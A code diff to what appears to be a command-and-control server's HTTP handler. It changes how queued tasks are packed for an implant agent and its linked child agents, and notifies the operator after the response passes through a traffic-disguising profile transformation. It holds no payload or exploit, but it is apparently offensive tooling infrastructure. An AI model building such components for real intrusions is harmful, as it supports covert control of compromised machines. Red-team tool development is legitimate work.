@@ -1,5 +1,5 @@
 import mummy, terminal
-import strutils, strformat
+import strutils, strformat, tables
 
 import ./handlers
 import ../globals
@@ -62,19 +62,24 @@ proc httpGet*(request: Request) =
 
         try: 
             var responseBytes: seq[byte]
-            let (agentId, tasks) = getTasks(heartbeat)
+            let tasks = getTasks(heartbeat)
 
             if tasks.len <= 0: 
                 request.respond(200, body = "")
                 return
 
-            # Create response, containing number of tasks, as well as length and content of each task
-            # This makes it easier for the agent to parse the tasks
-            responseBytes.add(cast[uint8](tasks.len))
+            # Return tasks for agent and linked children
+            for agentId, tasks in tasks: 
+                responseBytes.add(uint32.toBytes(string.toUuid(agentId)))           # 4 bytes agent ID
+                responseBytes.add(cast[uint8](tasks.len()))                         # 1 byte number of tasks for agent
 
-            for task in tasks:
-                responseBytes.add(uint32.toBytes(uint32(task.len))) 
-                responseBytes.add(task)
+                for task in tasks:
+                    responseBytes.add(uint32.toBytes(uint32(task.len)))             # 4 bytes length of task 
+                    responseBytes.add(task)                                         # variable length task
+                
+                # Notify operator that agent collected tasks
+                cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.")
+                cq.info(fmt"{$responseBytes.len} bytes sent.")
             
             # Apply data transformation to the response
             let payload = cq.profile.applyDataTransformation("http-get.server.output", responseBytes)
@@ -86,11 +91,8 @@ proc httpGet*(request: Request) =
 
             request.respond(200, headers = headers, body = payload)
 
-            # Notify operator that agent collected tasks
-            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.")
-            cq.info(fmt"{$responseBytes.len} bytes sent.")
-
         except CatchableError as err:
+            echo err.msg
             request.respond(404, body = "")
 
 #[
